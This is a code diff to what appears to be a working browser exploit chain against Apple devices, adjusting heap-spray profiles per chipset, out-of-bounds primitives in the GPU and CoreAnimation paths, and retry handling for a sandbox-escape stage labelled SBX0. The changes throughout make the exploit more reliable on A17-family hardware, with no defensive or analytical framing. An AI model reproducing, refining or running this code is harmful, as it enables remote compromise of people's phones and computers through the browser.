@@ -7112,17 +7112,46 @@
     "c90776dbac058ed6957f476e287867f8": spray_profiles.wide,
     "22f32fd975a694d340a6ad22b872b1ae": spray_profiles.wide
   };
+  const chipset_fallback_profile_sequences = {
+    // This A17/A17 Pro family hash regularly survives cleanly with the
+    // compact layouts but becomes much less stable once wide profiles are
+    // attempted or once we retry inside the same dirty WebContent process.
+    "c33e4990a9d3afe948b98d7d4205d596": [
+      spray_profiles.compact,
+      spray_profiles.compact_alt_fill
+    ]
+  };
+  const chipset_inprocess_attempt_budget = {
+    // Keep one CA OOB attempt per WebContent lifetime and rotate profiles
+    // across fresh runs via the persisted fallback-start index instead.
+    "c33e4990a9d3afe948b98d7d4205d596": 1
+  };
   const fallback_spray_profiles = [
     spray_profiles.compact,
     spray_profiles.compact_alt_fill,
     spray_profiles.wide_alt_fill,
     spray_profiles.wide
   ];
-  const fallback_spray_profile_count = fallback_spray_profiles.length;
+  const active_fallback_spray_profiles = chipset_fallback_profile_sequences[chipset] || fallback_spray_profiles;
+  const fallback_spray_profile_count = active_fallback_spray_profiles.length;
   let fallback_spray_start_index = parseInt(sbx0_fallback_start, 10);
   if (!isFinite(fallback_spray_start_index)) fallback_spray_start_index = 0;
   fallback_spray_start_index %= fallback_spray_profile_count;
   if (fallback_spray_start_index < 0) fallback_spray_start_index += fallback_spray_profile_count;
+  function currentExploitAttemptCount() {
+    return Math.max(0, retry_count - 1);
+  }
+  function shouldAbortInProcessRetry() {
+    if (chipset_spray_profile[chipset]) return false;
+    const max_attempts = chipset_inprocess_attempt_budget[chipset];
+    if (!isFinite(max_attempts)) return false;
+    return currentExploitAttemptCount() >= max_attempts;
+  }
+  function abortInProcessRetry(reason) {
+    const attempts = currentExploitAttemptCount();
+    LOG(`[x] ${reason}; aborting in-process retries after ${attempts}/${chipset_inprocess_attempt_budget[chipset]} attempt(s)`);
+    throw new Error(`SBX0 retry budget exhausted: ${reason}`);
+  }
   (function SBX0() {
     LOG(`[+] SBX0() (retry: ${retry_count++})`);
     function GPUConnectionToWebProcess_CreateRenderingBackend(backendConnection) {
@@ -7311,8 +7340,8 @@
       if (known_profile) {
         return known_profile;
       }
-      const fallback_index = (fallback_spray_start_index + Math.max(0, retry_count - 2)) % fallback_spray_profiles.length;
-      return fallback_spray_profiles[fallback_index];
+      const fallback_index = (fallback_spray_start_index + Math.max(0, retry_count - 2)) % active_fallback_spray_profiles.length;
+      return active_fallback_spray_profiles[fallback_index];
     }
     function applySprayPlan(plan) {
       for (const [count, size] of plan) {
@@ -7323,7 +7352,7 @@
       LOG(`oob()`);
       const spray_profile = currentSprayProfile();
       if (!chipset_spray_profile[chipset] && retry_count <= 2) {
-        LOG(`unknown chipset fallback_start=${fallback_spray_start_index}`);
+        LOG(`unknown chipset fallback_start=${fallback_spray_start_index} profile_count=${active_fallback_spray_profiles.length}`);
       }
       LOG(`spray profile: ${spray_profile.name} chipset=${chipset}`);
       const width = 1;
@@ -7549,7 +7578,10 @@
       fcall(offsets.WebProcess_ensureGPUProcessConnection, webProcess);
       fcall(offsets.pthread_setspecific, runLoopHolder_tid, 0n);
     }
-    function respawn_gpu_process_and_retry() {
+    function respawn_gpu_process_and_retry(reason = 'retry requested') {
+      if (shouldAbortInProcessRetry()) {
+        abortInProcessRetry(reason);
+      }
       LOG(`[-] going to respawn gpu process`);
       gpuProcessConnectionClosed();
       ensureGPUProcessConnection();
@@ -7660,11 +7692,11 @@
     initGLProgram();
     if (!oob()) {
       LOG("GPU crashed at agx oob");
-      return respawn_gpu_process_and_retry();
+      return respawn_gpu_process_and_retry('agx oob failed');
     }
     if (!preparePrimitives()) {
       LOG("GPU crashed at CoreAnimation oob");
-      return respawn_gpu_process_and_retry();
+      return respawn_gpu_process_and_retry('coreanimation oob failed');
     }
     gpu_slow_write64(offsets.free_slabs, 0n);
     LOG(`offsets.free_slabs: ${offsets.free_slabs.hex()}`);
